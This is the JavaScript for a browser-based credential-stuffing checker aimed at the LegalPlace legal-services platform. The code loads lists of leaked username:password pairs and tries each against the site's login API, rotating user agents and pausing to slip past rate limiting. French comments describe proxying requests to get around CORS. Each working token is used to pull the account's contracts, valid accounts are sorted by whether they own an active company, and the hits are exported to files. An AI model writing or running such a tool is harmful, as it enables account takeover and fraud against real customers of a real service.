// --- SPA NAVIGATION ROUTING ---
const navItems = document.querySelectorAll('.nav-item');
const views = document.querySelectorAll('.view');

navItems.forEach(item => {
    item.addEventListener('click', (e) => {
        if (item.classList.contains('disabled')) return;
        e.preventDefault();
        
        // Update active nav state
        navItems.forEach(nav => nav.classList.remove('active'));
        item.classList.add('active');
        
        // Update active view
        const targetId = item.getAttribute('data-target');
        views.forEach(view => {
            view.classList.remove('active');
            if (view.id === targetId) view.classList.add('active');
        });
    });
});

document.getElementById('btn-goto-legalplace').addEventListener('click', () => {
    document.querySelector('.nav-item[data-target="view-legalplace"]').click();
});

// --- LEGALPLACE APPLICATION LOGIC ---
const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/604.1"
];
function getRandomUA() { return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]; }

let isRunning = false;
let combos = [];
let currentIndex = 0;

let stats = {
    total: 0, tested: 0, societe: 0, empty: 0, hit: 0, fail: 0, error: 0
};

let downloadedFiles = {
    societe: [], empty: [], hit: []
};

// DOM Elements
const uploadZone = document.getElementById('upload-zone');
const fileInput = document.getElementById('file-input');
const btnStart = document.getElementById('btn-start');
const btnStop = document.getElementById('btn-stop');
const lpStatusBadge = document.getElementById('lp-status-badge');
const logConsole = document.getElementById('log-console');
const modal = document.getElementById('cors-modal');

// UI Mapping
const uiStats = {
    tested: document.getElementById('stat-tested'),
    total: document.getElementById('stat-total'),
    societe: document.getElementById('stat-societe'),
    empty: document.getElementById('stat-empty'),
    hit: document.getElementById('stat-hit'),
    fail: document.getElementById('stat-fail'),
    error: document.getElementById('stat-error')
};

function log(msg, type = 'info') {
    const el = document.createElement('div');
    el.className = `log-line log-${type}`;
    
    const timeSpan = document.createElement('span');
    timeSpan.className = 'log-time';
    
    const now = new Date();
    const timeStr = now.toTimeString().split(' ')[0];
    timeSpan.textContent = `[${timeStr}]`;
    
    el.appendChild(timeSpan);
    el.append(` ${msg}`);
    
    logConsole.appendChild(el);
    logConsole.scrollTop = logConsole.scrollHeight;
}

function updateStatsUI() {
    uiStats.tested.textContent = stats.tested;
    uiStats.total.textContent = `/ ${stats.total} Total`;
    uiStats.societe.textContent = stats.societe;
    uiStats.empty.textContent = stats.empty;
    uiStats.hit.textContent = stats.hit;
    uiStats.fail.textContent = stats.fail;
    uiStats.error.textContent = stats.error;
}

function setStatus(state) {
    if (state === 'running') {
        lpStatusBadge.textContent = 'EXECUTING';
        lpStatusBadge.classList.add('active');
        btnStart.disabled = true;
        btnStop.disabled = false;
    } else {
        lpStatusBadge.textContent = 'STANDBY';
        lpStatusBadge.classList.remove('active');
        btnStart.disabled = false;
        btnStop.disabled = true;
    }
}

// File Upload
fileInput.addEventListener('change', (e) => {
    const file = e.target.files[0];
    if (!file) return;
    handleFile(file);
});

uploadZone.addEventListener('dragover', (e) => { e.preventDefault(); uploadZone.classList.add('dragover'); });
uploadZone.addEventListener('dragleave', () => uploadZone.classList.remove('dragover'));
uploadZone.addEventListener('drop', (e) => {
    e.preventDefault();
    uploadZone.classList.remove('dragover');
    if (e.dataTransfer.files.length) {
        fileInput.files = e.dataTransfer.files;
        handleFile(e.dataTransfer.files[0]);
    }
});

function handleFile(file) {
    uploadZone.querySelector('.file-text').innerHTML = `<strong style="color:var(--text-primary);">${file.name}</strong> injected.`;
    
    const reader = new FileReader();
    reader.onload = (ev) => {
        const text = ev.target.result;
        combos = text.split('\n').map(l => l.trim()).filter(l => l.includes(':'));
        stats.total = combos.length;
        currentIndex = 0;
        stats.tested = stats.societe = stats.empty = stats.hit = stats.fail = stats.error = 0;
        downloadedFiles = { societe: [], empty: [], hit: [] };
        
        updateStatsUI();
        
        if (combos.length > 0) {
            btnStart.disabled = false;
            log(`Loaded ${combos.length} credential payloads. System ready.`, 'system');
        } else {
            btnStart.disabled = true;
            log(`Invalid format detected. Requires payload model user:pass`, 'error');
        }
    };
    reader.readAsText(file);
}

// --- CONFIGURATION API ---
// Magie Netlify : si on est hébergé (http/https), on utilise le proxy relatif local défini dans `_redirects`.
// Si on ouvre le fichier localement (file://), on attaque Legalplace en direct (nécessite l'extension).
const IS_LOCAL = window.location.protocol === 'file:';
const API_BASE = IS_LOCAL ? "https://clear-api.legalplace.fr" : "";

// API Interaction
async function checkAccount(username, password) {
    try {
        const payload = { username, password, locale: "fr_FR" };
        const res = await fetch(`${API_BASE}/api/v1/auth/login`, {
            method: "POST",
            headers: { 
                "accept": "application/json", 
                "content-type": "application/json",
                "user-agent": getRandomUA()
            },
            body: JSON.stringify(payload)
        });

        if (res.status === 200 || res.status === 201) {
            const bodyText = await res.text();
            let token = null;
            
            if (bodyText.startsWith("eyJ")) {
                token = bodyText;
            } else {
                try {
                    const data = JSON.parse(bodyText);
                    token = data.access_token;
                } catch(e) { }
            }

            if (token) {
                const hasSociete = await checkSociete(token);
                if (hasSociete) return "VALID_SOCIETE";
                else return "EMPTY_ACCOUNT";
            }
            return "SUCCESS_OTHER";
        } else if (res.status === 401 || res.status === 400 || res.status === 404) {
            return "AUTH_FAILED";
        } else if (res.status === 403) {
            return "FORBIDDEN";
        } else if (res.status === 429) {
            return "RATE_LIMIT";
        } else {
            return `UNEXPECTED_HTTP_${res.status}`;
        }
    } catch (e) {
        if (e.message.includes("Failed to fetch") || e.message.includes("NetworkError")) {
            return "CORS_POLICY_ERROR";
        }
        return `NETWORK_EXCEPTION (${e.message})`;
    }
}

async function checkSociete(token) {
    try {
        const payload = { "page": 0, "cache": false, "skip": 0, "take": 10 };
        const res = await fetch(`${API_BASE}/api/v1/account/contracts/demarche`, {
            method: "POST",
            headers: {
                "accept": "application/json",
                "content-type": "application/json",
                "authorization": `Bearer ${token}`,
                "user-agent": getRandomUA()
            },
            body: JSON.stringify(payload)
        });
        
        if (res.status === 200) {
            const respData = await res.json();
            const contracts = respData.data || [];
            
            let hasSociete = false;
            let hasDissolution = false;
            
            for (let c of contracts) {
                const metaName = (c.meta_name || "").toLowerCase();
                const status = (c.status || "").toLowerCase();
                const state = (c.state || "").toLowerCase();
                const payStatus = (c.paymentStatus || "").toLowerCase();
                
                const draftWords = ["draft", "cart", "pending", "brouillon", "abandoned", "canceled", "unpaid", "attente"];
                let isDraft = draftWords.some(w => status.includes(w) || state.includes(w) || payStatus.includes(w));
                
                const excluded = ["dissolution", "radiation", "fermeture", "liquidation", "cessation"];
                const keywords = ["société", "societe", "micro-entreprise", "micro entreprise"];
                
                if (excluded.some(ex => metaName.includes(ex))) hasDissolution = true;
                if (keywords.some(kw => metaName.includes(kw))) {
                    if (!isDraft) hasSociete = true;
                }
            }
            if (hasDissolution) return false;
            return hasSociete;
        }
        return false;
    } catch (e) {
        return false;
    }
}

// Process Loop
async function runLoop() {
    while (isRunning && currentIndex < combos.length) {
        const line = combos[currentIndex];
        const [u, p] = line.split(':');
        
        let result = await checkAccount(u, p);
        stats.tested++;

        if (result === "CORS_POLICY_ERROR") {
            log(`Process terminated. CORS policy blocking external HTTP fetch.`, 'error');
            modal.classList.remove('hidden');
            stopChecking();
            break;
        }
        
        if (result === "VALID_SOCIETE") {
            stats.societe++;
            downloadedFiles.societe.push(line);
            log(`Valid account resolved (Company Profile Activity): ${u}`, "hit_societe");
        } else if (result === "EMPTY_ACCOUNT") {
            stats.empty++;
            downloadedFiles.empty.push(line);
            log(`Valid account resolved (Empty/No Company attached): ${u}`, "hit_empty");
        } else if (result === "SUCCESS_OTHER") {
            stats.hit++;
            downloadedFiles.hit.push(line);
            log(`Authentication successful (Unknown Context): ${u}`, "hit");
        } else if (result === "AUTH_FAILED") {
            stats.fail++;
            log(`Authentication rejected: ${u}`, "info");
        } else {
            stats.error++;
            log(`Process encountered exception [${result}]: ${u}`, "error");
        }
        
        updateStatsUI();
        currentIndex++;
        
        if (isRunning && currentIndex < combos.length) {
            // Cooldown très court: entre 2 et 5 secondes
            let currentDelay = Math.floor((2 + Math.random() * 3) * 10) / 10;
            
            if (result === "RATE_LIMIT" || result === "FORBIDDEN") {
                currentDelay = 30 + Math.random() * 15;
                log(`WAF rate limit triggered. Engaging passive cooldown: ${currentDelay.toFixed(0)}s`, 'error');
            } else {
                log(`Awaiting operational cycle: ${currentDelay.toFixed(1)}s`, 'system');
            }
            
            let waitMs = currentDelay * 1000;
            let start = Date.now();
            
            while (isRunning && (Date.now() - start < waitMs)) {
                await new Promise(r => setTimeout(r, 200));
            }
        }
    }
    
    if (currentIndex >= combos.length && isRunning) {
        log("Process completed. All payloads verified.", "system");
        stopChecking();
    }
}

function startChecking() {
    if (combos.length === 0) return;
    if (currentIndex >= combos.length) {
        log("Sequence EOF reached. Require new payload source mapping.", "info");
        return;
    }
    
    isRunning = true;
    setStatus('running');
    log("Initializing validation process cluster...", "system");
    runLoop();
}

function stopChecking() {
    if(isRunning) {
        log("Process gracefully paused.", "system");
    }
    isRunning = false;
    setStatus('standby');
}

btnStart.addEventListener('click', startChecking);
btnStop.addEventListener('click', stopChecking);

document.getElementById('btn-close-modal').addEventListener('click', () => {
    modal.classList.add('hidden');
});

// Exports
function downloadTxt(filename, linesArray) {
    if (!linesArray || linesArray.length === 0) {
        log(`No data available for export segment [${filename}]`, 'error');
        return;
    }
    const txtContent = linesArray.join("\n");
    const blob = new Blob([txtContent], { type: "text/plain;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    log(`Dataset successfully packaged -> ${filename}`, 'system');
}

document.getElementById('btn-dl-societe').addEventListener('click', () => downloadTxt('societe.txt', downloadedFiles.societe));
document.getElementById('btn-dl-empty').addEventListener('click', () => downloadTxt('empty.txt', downloadedFiles.empty));
document.getElementById('btn-dl-hit').addEventListener('click', () => downloadTxt('hits.txt', downloadedFiles.hit));
